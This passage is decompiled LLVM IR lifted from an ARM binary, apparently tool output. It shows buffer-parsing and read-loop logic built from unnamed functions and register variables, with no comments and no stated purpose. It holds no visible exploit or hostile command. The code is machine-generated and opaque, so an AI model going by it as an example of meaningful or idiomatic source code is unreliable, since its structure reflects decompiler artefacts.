  %v3_94e0 = mul i32 %v3_94dc, 128
  %v1_94e4 = add i32 %v3_94e0, 1472
  %v0_94e8 = load i32, i32* @r5, align 4
  store i32 %v0_94e8, i32* %r1.global-to-local, align 4
  %v0_94ec = load i32, i32* %sb.global-to-local, align 4
  %v2_94ec = add i32 %v1_94e4, %v0_94ec
  store i32 %v2_94ec, i32* @r0, align 4
  %v2_94f0 = inttoptr i32 %v2_94ec to i8*
  %v3_94f0 = call i32 @function_124a8(i8* %v2_94f0, i32 %v0_94e8)
  store i32 %v3_94f0, i32* %r0.global-to-local, align 4
  %v0_94f4 = load i32, i32* @sl, align 4
  %v1_94f4 = add i32 %v0_94f4, 16
  %v2_94f4 = inttoptr i32 %v1_94f4 to i32*
  %v3_94f4 = load i32, i32* %v2_94f4, align 4
  %v0_94f8 = load i32, i32* @r8, align 4
  store i32 %v0_94f8, i32* @r5, align 4
  %v1_94fc = add i32 %v3_94f4, 1
  store i32 %v1_94fc, i32* %r3.global-to-local, align 4
  store i32 %v1_94fc, i32* %v2_94f4, align 4
  %v1_931c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9310

dec_label_pc_9508:                                ; preds = %dec_label_pc_9628
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_950c = load i32, i32* @r4, align 4
  %v2_950c = inttoptr i32 %v1_950c to i32*
  store i32 104, i32* %v2_950c, align 4
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9654, %dec_label_pc_8fe8, %dec_label_pc_9508
  %v0_9510 = load i32, i32* @sl, align 4
  %v1_9510 = add i32 %v0_9510, -1452
  %v2_9510 = inttoptr i32 %v1_9510 to i32*
  %v3_9510 = load i32, i32* %v2_9510, align 4
  store i32 %v3_9510, i32* %r0.global-to-local, align 4
  %v1_9514 = call i32 @function_1314c(i32 %v3_9510)
  store i32 %v1_9514, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_9520 = load i32, i32* @sl, align 4
  %v2_9520 = add i32 %v1_9520, -1452
  %v3_9520 = inttoptr i32 %v2_9520 to i32*
  store i32 -1, i32* %v3_9520, align 4
  %v0_9524 = load i32, i32* %r2.global-to-local, align 4
  %v1_9524 = trunc i32 %v0_9524 to i8
  %v2_9524 = load i32, i32* @sl, align 4
  %v3_9524 = add i32 %v2_9524, -1448
  %v4_9524 = inttoptr i32 %v3_9524 to i8*
  store i8 %v1_9524, i8* %v4_9524, align 1
  br label %dec_label_pc_87ac

dec_label_pc_952c:                                ; preds = %dec_label_pc_8594
  store i32 %v1_8594, i32* %r3.global-to-local, align 4
  %v1_9530 = trunc i32 %v1_8594 to i8
  store i8 %v1_9530, i8* %v2_85cc, align 1
  %v0_9534 = load i32, i32* @r6, align 4
  %v1_9534 = add i32 %v0_9534, -1452
  %v2_9534 = inttoptr i32 %v1_9534 to i32*
  %v3_9534 = load i32, i32* %v2_9534, align 4
  store i32 %v3_9534, i32* %r0.global-to-local, align 4
  %v1_9538 = call i32 @function_1314c(i32 %v3_9534)
  store i32 %v1_9538, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9540 = load i32, i32* @r6, align 4
  %v2_9540 = add i32 %v1_9540, -1452
  %v3_9540 = inttoptr i32 %v2_9540 to i32*
  store i32 -1, i32* %v3_9540, align 4
  br label %dec_label_pc_85b4

dec_label_pc_9548:                                ; preds = %dec_label_pc_9348, %dec_label_pc_9310
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9550 = call i32 @function_11b24(i32 38, i32* null)
  %v0_9554 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9554, i32* @r1, align 4
  store i32 %v3_9550, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_9560 = call i32 @function_127d0(i8* %tmp168, i32 %v0_9554, i32 %v3_9550)
  store i32 %v4_9560, i32* %r0.global-to-local, align 4
  %v2_9564 = icmp eq i32 %v4_9560, -1
  store i1 %v2_9564, i1* %cpsr_c.global-to-local, align 1
  %v7_9564 = icmp eq i32 %v4_9560, -1
  store i1 %v7_9564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9564, label %dec_label_pc_96d8, label %dec_label_pc_956c

dec_label_pc_956c:                                ; preds = %dec_label_pc_9548
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9574 = call i32 @function_11b24(i32 38, i32* null)
  %v0_9578 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9578, i32* @r1, align 4
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_9584 = call i32 @function_127d0(i8* %tmp168, i32 %v0_9578, i32 %v3_9574)
  store i32 %v4_9584, i32* %r0.global-to-local, align 4
  %v2_958c = add i32 %v4_9584, %v2_823c
  %v3_958c = inttoptr i32 %v2_958c to i8*
  %v4_958c = load i8, i8* %v3_958c, align 1
  %v2_9594 = icmp ugt i8 %v4_958c, 31
  store i1 %v2_9594, i1* %cpsr_c.global-to-local, align 1
  %v7_9594 = icmp eq i8 %v4_958c, 32
  store i1 %v7_9594, i1* %cpsr_z.global-to-local, align 1
  %v2_959c = zext i1 %v7_9594 to i32
  %v2_959c.v4_9584 = add i32 %v2_959c, %v4_9584
  store i32 %v2_959c.v4_9584, i32* @r4, align 4
  %v2_95a0 = add i32 %v2_959c.v4_9584, %v2_823c
  store i32 %v2_95a0, i32* @r6, align 4
  store i32 %v2_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = load i32, i32* %fp.global-to-local, align 4
  %v2_95a8 = sub i32 %v1_95a8, %v2_959c.v4_9584
  store i32 %v2_95a8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_95b4 = call i32 @function_12538(i32 %v2_95a0, i32 %v2_95a8, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2)
  store i32 %v5_95b4, i32* %r0.global-to-local, align 4
  %v2_95b8 = icmp eq i32 %v5_95b4, -1
  store i1 %v2_95b8, i1* %cpsr_c.global-to-local, align 1
  %v7_95b8 = icmp eq i32 %v5_95b4, -1
  store i1 %v7_95b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95b8, label %dec_label_pc_96d8, label %dec_label_pc_95c0

dec_label_pc_95c0:                                ; preds = %dec_label_pc_956c
  %v2_95c0 = icmp ne i32 %v5_95b4, 0
  store i1 %v2_95c0, i1* %cpsr_c.global-to-local, align 1
  %v7_95c0 = icmp eq i32 %v5_95b4, 1
  store i1 %v7_95c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8654, i32* %r2.global-to-local, align 4
  %v7_95c8 = icmp slt i32 %v5_95b4, 2
  br i1 %v7_95c8, label %bb201, label %bb200

bb200:                                            ; preds = %dec_label_pc_95c0
  %v9_95c8 = add i32 %v5_95b4, -2
  store i32 %v9_95c8, i32* %r0.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %dec_label_pc_95c0, %bb200
  %v1_95d0 = phi i32 [ %v5_95b4, %dec_label_pc_95c0 ], [ %v9_95c8, %bb200 ]
  %v2_95d0 = add i32 %v1_95d0, %v2_86d0
  store i32 -20773, i32* @lr, align 4
  %v1_95d8 = add i32 %v1_95d0, 1
  store i32 %v1_95d8, i32* @r5, align 4
  %v1_95dc = load i32, i32* @r4, align 4
  %v2_95dc = add i32 %v2_95d0, %v1_95dc
  store i32 %v2_95dc, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_95e4 = load i32, i32* @r6, align 4
  store i32 %v0_95e4, i32* %r0.global-to-local, align 4
  store i32 %v1_95d8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18530.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_95f4 = add i32 %v2_95dc, -20773
  %v5_95f4 = inttoptr i32 %v4_95f4 to i8*
  store i8 0, i8* %v5_95f4, align 1
  %v5_95f8 = call i32 @function_12538(i32 %v0_95e4, i32 %v1_95d8, i32 ptrtoint ([5 x i8]* @global_var_18530.40 to i32), i32 4)
  store i32 %v5_95f8, i32* %r0.global-to-local, align 4
  %v2_95fc = icmp ugt i32 %v5_95f8, 3
  store i1 %v2_95fc, i1* %cpsr_c.global-to-local, align 1
  %v7_95fc = icmp eq i32 %v5_95f8, 4
  store i1 %v7_95fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95fc, label %dec_label_pc_99c0, label %dec_label_pc_9604

dec_label_pc_9604:                                ; preds = %bb201
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  %v1_9608 = load i32, i32* @r4, align 4
  %v2_9608 = add i32 %v1_9608, %v2_823c
  %v3_9608 = inttoptr i32 %v2_9608 to i8*
  %v4_9608 = load i8, i8* %v3_9608, align 1
  %v6_9608 = zext i8 %v4_9608 to i32
  store i32 %v6_9608, i32* %r3.global-to-local, align 4
  %v2_960c = icmp ugt i8 %v4_9608, 46
  store i1 %v2_960c, i1* %cpsr_c.global-to-local, align 1
  %v7_960c = icmp eq i8 %v4_9608, 47
  store i1 %v7_960c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_960c, label %dec_label_pc_9bc0, label %dec_label_pc_9614

dec_label_pc_9614:                                ; preds = %dec_label_pc_9660, %dec_label_pc_9bf0, %dec_label_pc_9bc0, %dec_label_pc_9a90, %dec_label_pc_9a74, %dec_label_pc_9604, %dec_label_pc_9c08, %dec_label_pc_9abc
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9618 = load i32, i32* @sl, align 4
  %v3_9618 = add i32 %v2_9618, -1448
  %v4_9618 = inttoptr i32 %v3_9618 to i8*
  store i8 1, i8* %v4_9618, align 1
  br label %dec_label_pc_87ac

dec_label_pc_9620:                                ; preds = %dec_label_pc_87a4
  %v0_9620 = call i32 @function_13574()
  store i32 %v0_9620, i32* %r0.global-to-local, align 4
  store i32 %v0_9620, i32* @r4, align 4
  br label %dec_label_pc_9628

dec_label_pc_9628:                                ; preds = %dec_label_pc_964c, %dec_label_pc_9620
  %v1_962c = phi i32 [ %v0_9620, %dec_label_pc_9620 ], [ %v0_9654, %dec_label_pc_964c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_962c = inttoptr i32 %v1_962c to i32*
  store i32 0, i32* %v2_962c, align 4
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  %v0_9634 = load i32, i32* @sl, align 4
  %v1_9634 = add i32 %v0_9634, -1452
  %v2_9634 = inttoptr i32 %v1_9634 to i32*
  %v3_9634 = load i32, i32* %v2_9634, align 4
  store i32 %v3_9634, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_963c = load i32, i32* %r3.global-to-local, align 4
  %v1_963c = add i32 %v0_963c, 16384
  store i32 %v1_963c, i32* %r3.global-to-local, align 4
  %v4_9640 = call i32 @function_13810(i32 %v3_9634, i32 %v2_823c, i32 10240, i32 %v1_963c)
  store i32 %v4_9640, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9644 = icmp eq i32 %v4_9640, 0
  store i1 %v2_9644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9644, label %dec_label_pc_9508, label %dec_label_pc_964c

dec_label_pc_964c:                                ; preds = %dec_label_pc_9628
  %v3_964c = icmp eq i32 %v4_9640, -1
  store i1 %v3_964c, i1* %cpsr_c.global-to-local, align 1
  %v8_964c = icmp eq i32 %v4_9640, -1
  store i1 %v8_964c, i1* %cpsr_z.global-to-local, align 1
  %v0_9654 = load i32, i32* @r4, align 4
  br i1 %v3_964c, label %dec_label_pc_9654, label %dec_label_pc_9628

dec_label_pc_9654:                                ; preds = %dec_label_pc_964c
  %v1_9654 = inttoptr i32 %v0_9654 to i32*
  %v2_9654 = load i32, i32* %v1_9654, align 4
  store i32 %v2_9654, i32* %r3.global-to-local, align 4
  %v2_9658 = icmp ugt i32 %v2_9654, 10
  store i1 %v2_9658, i1* %cpsr_c.global-to-local, align 1
  %v7_9658 = icmp eq i32 %v2_9654, 11
  store i1 %v7_9658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9658, label %dec_label_pc_9660, label %dec_label_pc_9510

dec_label_pc_9660:                                ; preds = %dec_label_pc_9654
  %v0_9660 = load i32, i32* @sl, align 4
  %v1_9660 = add i32 %v0_9660, -1448
  %v2_9660 = inttoptr i32 %v1_9660 to i8*
  %v3_9660 = load i8, i8* %v2_9660, align 1
  %v4_9660 = zext i8 %v3_9660 to i32
  store i32 %v4_9660, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9664 = icmp eq i8 %v3_9660, 0
  store i1 %v2_9664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9664, label %dec_label_pc_87ac, label %dec_label_pc_9614

dec_label_pc_9670:                                ; preds = %dec_label_pc_8db4
  %v0_9670 = load i32, i32* %r3.global-to-local, align 4
  %v1_9670 = add i32 %v0_9670, 1
  store i32 %v1_9670, i32* %r3.global-to-local, align 4
  %v1_9674 = trunc i32 %v1_9670 to i8
  %v2_9674 = load i32, i32* @sl, align 4
  %v3_9674 = add i32 %v2_9674, -1448
  %v4_9674 = inttoptr i32 %v3_9674 to i8*
  store i8 %v1_9674, i8* %v4_9674, align 1
  br label %dec_label_pc_87ac

dec_label_pc_967c:                                ; preds = %dec_label_pc_8c2c
  %v0_967c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_967c, i32* @r0, align 4
  %v0_9680 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_9680, i32* %r1.global-to-local, align 4
  %v2_9684 = inttoptr i32 %v0_967c to i8*
  %v3_9684 = call i32 @function_124a8(i8* %v2_9684, i32 %v0_9680)
  store i32 %v3_9684, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c44

dec_label_pc_968c:                                ; preds = %dec_label_pc_8d34
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_9690 = load i32, i32* %fp.global-to-local, align 4
  %v2_9690 = inttoptr i32 %v1_9690 to i32*
  store i32 104, i32* %v2_9690, align 4
  %v0_9694 = load i32, i32* @sl, align 4
  %v1_9694 = add i32 %v0_9694, -1452
  %v2_9694 = inttoptr i32 %v1_9694 to i32*
  %v3_9694 = load i32, i32* %v2_9694, align 4
  store i32 %v3_9694, i32* %r0.global-to-local, align 4
  %v1_9698 = call i32 @function_1314c(i32 %v3_9694)
  store i32 %v1_9698, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_96a4 = load i32, i32* @sl, align 4
  %v2_96a4 = add i32 %v1_96a4, -1452
  %v3_96a4 = inttoptr i32 %v2_96a4 to i32*
  store i32 -1, i32* %v3_96a4, align 4
  %v0_96a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_96a8 = trunc i32 %v0_96a8 to i8
  %v2_96a8 = load i32, i32* @sl, align 4
  %v3_96a8 = add i32 %v2_96a8, -1448
  %v4_96a8 = inttoptr i32 %v3_96a8 to i8*
  store i8 %v1_96a8, i8* %v4_96a8, align 1
  br label %dec_label_pc_87ac

dec_label_pc_96b0:                                ; preds = %dec_label_pc_8d5c
  %v0_96b0 = load i32, i32* %fp.global-to-local, align 4
  %v1_96b0 = inttoptr i32 %v0_96b0 to i32*
  %v2_96b0 = load i32, i32* %v1_96b0, align 4
  store i32 %v2_96b0, i32* %r3.global-to-local, align 4
  %v2_96b4 = icmp ugt i32 %v2_96b0, 10
  store i1 %v2_96b4, i1* %cpsr_c.global-to-local, align 1
  %v7_96b4 = icmp eq i32 %v2_96b0, 11
  store i1 %v7_96b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_96b4, label %dec_label_pc_87ac, label %dec_label_pc_96bc

dec_label_pc_96bc:                                ; preds = %dec_label_pc_96b0
  %v0_96bc = load i32, i32* @sl, align 4
  %v1_96bc = add i32 %v0_96bc, -1452
  %v2_96bc = inttoptr i32 %v1_96bc to i32*
  %v3_96bc = load i32, i32* %v2_96bc, align 4
  store i32 %v3_96bc, i32* %r0.global-to-local, align 4
  %v1_96c0 = call i32 @function_1314c(i32 %v3_96bc)
  store i32 %v1_96c0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_96cc = load i32, i32* @sl, align 4
  %v2_96cc = add i32 %v1_96cc, -1452
  %v3_96cc = inttoptr i32 %v2_96cc to i32*
  store i32 -1, i32* %v3_96cc, align 4
  %v0_96d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_96d0 = trunc i32 %v0_96d0 to i8
  %v2_96d0 = load i32, i32* @sl, align 4
  %v3_96d0 = add i32 %v2_96d0, -1448
  %v4_96d0 = inttoptr i32 %v3_96d0 to i8*
  store i8 %v1_96d0, i8* %v4_96d0, align 1
  br label %dec_label_pc_87ac

dec_label_pc_96d8:                                ; preds = %dec_label_pc_956c, %dec_label_pc_9548
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_96e0 = call i32 @function_11b24(i32 37, i32* null)
  %v0_96e4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_96e4, i32* @r1, align 4
  store i32 %v3_96e0, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_96f0 = call i32 @function_127d0(i8* %tmp168, i32 %v0_96e4, i32 %v3_96e0)
  store i32 %v4_96f0, i32* %r0.global-to-local, align 4
  %v2_96f8 = icmp eq i32 %v4_96f0, -1
  store i1 %v2_96f8, i1* %cpsr_c.global-to-local, align 1
  %v7_96f8 = icmp eq i32 %v4_96f0, -1
  store i1 %v7_96f8, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_96f8, label %dec_label_pc_98f8, label %dec_label_pc_9704

dec_label_pc_9704:                                ; preds = %dec_label_pc_96d8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_970c = call i32 @function_11b24(i32 37, i32* null)
  %v0_9710 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9710, i32* @r1, align 4
  store i32 %v3_970c, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_971c = call i32 @function_127d0(i8* %tmp168, i32 %v0_9710, i32 %v3_970c)
  store i32 %v4_971c, i32* %r0.global-to-local, align 4
  %v2_9724 = add i32 %v4_971c, %v2_823c
  %v3_9724 = inttoptr i32 %v2_9724 to i8*
  %v4_9724 = load i8, i8* %v3_9724, align 1
  %v2_972c = icmp ugt i8 %v4_9724, 31
  store i1 %v2_972c, i1* %cpsr_c.global-to-local, align 1
  %v7_972c = icmp eq i8 %v4_9724, 32
  store i1 %v7_972c, i1* %cpsr_z.global-to-local, align 1
  %v2_9734 = zext i1 %v7_972c to i32
  %v2_9734.v4_971c = add i32 %v2_9734, %v4_971c
  store i32 %v2_9734.v4_971c, i32* @r4, align 4
  %v2_9738 = add i32 %v2_9734.v4_971c, %v2_823c
  store i32 %v2_9738, i32* @r5, align 4
  store i32 %v2_9738, i32* %r0.global-to-local, align 4
  %v1_9740 = load i32, i32* %fp.global-to-local, align 4
  %v2_9740 = sub i32 %v1_9740, %v2_9734.v4_971c
  store i32 %v2_9740, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_974c = call i32 @function_12538(i32 %v2_9738, i32 %v2_9740, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2)
  store i32 %v5_974c, i32* %r0.global-to-local, align 4
  %v2_9750 = icmp eq i32 %v5_974c, -1
  store i1 %v2_9750, i1* %cpsr_c.global-to-local, align 1
  %v7_9750 = icmp eq i32 %v5_974c, -1
  store i1 %v7_9750, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_974c, i32* @r7, align 4
  br i1 %v7_9750, label %dec_label_pc_98f8, label %dec_label_pc_975c

dec_label_pc_975c:                                ; preds = %dec_label_pc_9704
  %v2_975c = icmp ne i32 %v5_974c, 0
  store i1 %v2_975c, i1* %cpsr_c.global-to-local, align 1
  %v7_975c = icmp eq i32 %v5_974c, 1
  store i1 %v7_975c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8654, i32* %ip.global-to-local, align 4
  %v7_9764 = icmp slt i32 %v5_974c, 2
  br i1 %v7_9764, label %bb203, label %bb202

bb202:                                            ; preds = %dec_label_pc_975c
  %v9_9764 = add i32 %v5_974c, -2
  store i32 %v9_9764, i32* @r7, align 4
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_975c, %bb202
  %v1_976c = phi i32 [ %v5_974c, %dec_label_pc_975c ], [ %v9_9764, %bb202 ]
  store i32 %v2_86d0, i32* %ip.global-to-local, align 4
  %v2_976c = add i32 %v1_976c, %v2_86d0
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9774 = load i32, i32* @r4, align 4
  %v2_9774 = add i32 %v2_976c, %v1_9774
  store i32 %v2_9774, i32* %r2.global-to-local, align 4
  %v3_9778 = load i32, i32* @r6, align 4
  %v4_9778 = add i32 %v3_9778, %v2_9774
  %v5_9778 = inttoptr i32 %v4_9778 to i8*
  store i8 0, i8* %v5_9778, align 1
  store i32 %v10_82b0, i32* @lr, align 4
  %v0_9780 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_9780, i32* %stack_var_-44, align 4
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  %v1_9788 = load i32, i32* @r4, align 4
  %v2_9788 = add i32 %v1_9788, %v2_823c
  %v3_9788 = inttoptr i32 %v2_9788 to i8*
  %v4_9788 = load i8, i8* %v3_9788, align 1
  %v6_9788 = zext i8 %v4_9788 to i32
  store i32 %v6_9788, i32* %r0.global-to-local, align 4
  %v1_978c = add nsw i32 %v6_9788, -48
  store i32 %v1_978c, i32* %r3.global-to-local, align 4
  %v2_9790 = icmp ugt i32 %v1_978c, 8
  store i1 %v2_9790, i1* %cpsr_c.global-to-local, align 1
  %v7_9790 = icmp eq i32 %v1_978c, 9
  store i1 %v7_9790, i1* %cpsr_z.global-to-local, align 1
  %v2_9794 = xor i1 %v7_9790, true
  %v3_9794 = and i1 %v2_9790, %v2_9794
  br i1 %v3_9794, label %.thread113, label %dec_label_pc_979c

.thread113:                                       ; preds = %bb203
  %v4_9794 = load i32, i32* @r5, align 4
  store i32 %v4_9794, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_97c4

dec_label_pc_979c:                                ; preds = %bb203
  %v1_97a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_97a0

dec_label_pc_97a0:                                ; preds = %dec_label_pc_97a0, %dec_label_pc_979c
  %v0_97b8 = phi i32 [ %v1_97b8, %dec_label_pc_97a0 ], [ 1, %dec_label_pc_979c ]
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  store i32 %v0_97b8, i32* %stack_var_-44, align 4
  %v2_97a8 = add i32 %v0_97b8, %v1_97a8.pre
  %v3_97a8 = inttoptr i32 %v2_97a8 to i8*
  %v4_97a8 = load i8, i8* %v3_97a8, align 1
  %v6_97a8 = zext i8 %v4_97a8 to i32
  store i32 %v6_97a8, i32* %r0.global-to-local, align 4
  %v1_97ac = add nsw i32 %v6_97a8, -48
  store i32 %v1_97ac, i32* %r3.global-to-local, align 4
  store i32 %v0_97b8, i32* %ip.global-to-local, align 4
  %v2_97b4 = icmp ugt i32 %v1_97ac, 8
  store i1 %v2_97b4, i1* %cpsr_c.global-to-local, align 1
  %v7_97b4 = icmp eq i32 %v1_97ac, 9
  store i1 %v7_97b4, i1* %cpsr_z.global-to-local, align 1
  %v1_97b8 = add i32 %v0_97b8, 1
  store i32 %v1_97b8, i32* @lr, align 4
  store i32 %v2_97a8, i32* %r1.global-to-local, align 4
  %v2_97c0 = xor i1 %v2_97b4, true
  %v3_97c0 = or i1 %v7_97b4, %v2_97c0
  br i1 %v3_97c0, label %dec_label_pc_97a0, label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %dec_label_pc_97a0, %.thread113
  %v2_97d0 = phi i32 [ %v4_9794, %.thread113 ], [ %v2_97a8, %dec_label_pc_97a0 ]
  %v0_97c4 = phi i32 [ %v6_9788, %.thread113 ], [ %v6_97a8, %dec_label_pc_97a0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_97c4 = icmp eq i32 %v0_97c4, 0
  store i1 %v2_97c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_97c4, label %dec_label_pc_98f8, label %dec_label_pc_97cc

dec_label_pc_97cc:                                ; preds = %dec_label_pc_97c4
  store i32 0, i32* @r6, align 4
  %v3_97d0 = inttoptr i32 %v2_97d0 to i8*
  store i8 0, i8* %v3_97d0, align 1
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_97d8 = load i32, i32* %stack_var_-44, align 4
  %v1_97dc = add i32 %v3_97d8, 1
  store i32 %v1_97dc, i32* %ip.global-to-local, align 4
  store i32 %v1_97dc, i32* %stack_var_-44, align 4
  %v0_97e4 = load i32, i32* @r5, align 4
  %v2_97e4 = add i32 %v0_97e4, %v1_97dc
  %v3_97e4 = inttoptr i32 %v2_97e4 to i8*
  %v4_97e4 = load i8, i8* %v3_97e4, align 1
  %v6_97e4 = zext i8 %v4_97e4 to i32
  store i32 %v6_97e4, i32* %r3.global-to-local, align 4
  %v2_97e8 = icmp ugt i8 %v4_97e4, 31
  store i1 %v2_97e8, i1* %cpsr_c.global-to-local, align 1
  %v7_97e8 = icmp eq i8 %v4_97e4, 32
  store i1 %v7_97e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97e8, label %bb205, label %bb204

bb204:                                            ; preds = %dec_label_pc_97cc
  store i32 %v2_97e4, i32* @r4, align 4
  br label %.thread37

bb205:                                            ; preds = %dec_label_pc_97cc
  %v2_97ec = add i32 %v3_97d8, 2
  store i32 %v2_97ec, i32* %ip.global-to-local, align 4
  %v2_97f0 = add i32 %v0_97e4, %v2_97ec
  store i32 %v2_97f0, i32* @r4, align 4
  store i32 %v10_82b0, i32* @lr, align 4
  store i32 %v2_97ec, i32* %v11_82b4, align 4
  %v0_97fc.pre = load i32, i32* @r4, align 4
  br label %.thread37

.thread37:                                        ; preds = %bb204, %bb205
  %v0_97fc = phi i32 [ %v2_97e4, %bb204 ], [ %v0_97fc.pre, %bb205 ]
  store i32 %v0_97fc, i32* %r0.global-to-local, align 4
  %v1_9800 = inttoptr i32 %v0_97fc to i8*
  %v2_9800 = call i32 @function_12480(i8* %v1_9800)
  store i32 ptrtoint ([5 x i8]* @global_var_18538.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9800, i32* @r1, align 4
  %v0_980c = load i32, i32* @r4, align 4
  store i32 %v0_980c, i32* %r0.global-to-local, align 4
  %v3_9810 = inttoptr i32 %v0_980c to i8*
  %v4_9810 = call i32 @function_127d0(i8* %v3_9810, i32 %v2_9800, i32 ptrtoint ([5 x i8]* @global_var_18538.42 to i32))
  store i32 %v4_9810, i32* %r0.global-to-local, align 4
  %v2_9814 = icmp eq i32 %v4_9810, -1
  store i1 %v2_9814, i1* %cpsr_c.global-to-local, align 1
  %v7_9814 = icmp eq i32 %v4_9810, -1
  store i1 %v7_9814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9814, label %.thread38, label %dec_label_pc_9824

.thread38:                                        ; preds = %.thread37
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v4_981c = load i32, i32* %v11_82b4, align 4
  store i32 %v4_981c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9858

dec_label_pc_9824:                                ; preds = %.thread37
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_9828 = load i32, i32* %stack_var_-44, align 4
  %v0_982c = load i32, i32* @r5, align 4
  %v2_982c = add i32 %v0_982c, %v3_9828
  store i32 %v2_982c, i32* @r4, align 4
  store i32 %v2_982c, i32* %r0.global-to-local, align 4
  %v1_9834 = inttoptr i32 %v2_982c to i8*
  %v2_9834 = call i32 @function_12480(i8* %v1_9834)
  store i32 ptrtoint ([5 x i8]* @global_var_18538.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9834, i32* @r1, align 4
  %v0_9840 = load i32, i32* @r4, align 4
  store i32 %v0_9840, i32* %r0.global-to-local, align 4
  %v4_9844 = inttoptr i32 %v0_9840 to i8*
  %v5_9844 = call i32 @function_127d0(i8* %v4_9844, i32 %v2_9834, i32 ptrtoint ([5 x i8]* @global_var_18538.42 to i32))
  store i32 %v5_9844, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  %v3_984c = load i32, i32* %stack_var_-44, align 4
  %v2_9850 = add i32 %v3_984c, %v5_9844
  store i32 %v2_9850, i32* %ip.global-to-local, align 4
  store i32 %v2_9850, i32* %stack_var_-44, align 4
  br label %dec_label_pc_9858

dec_label_pc_9858:                                ; preds = %.thread38, %dec_label_pc_9824
  %v0_9d34 = phi i32 [ %v4_981c, %.thread38 ], [ %v2_9850, %dec_label_pc_9824 ]
  %v0_9858 = load i32, i32* @r5, align 4
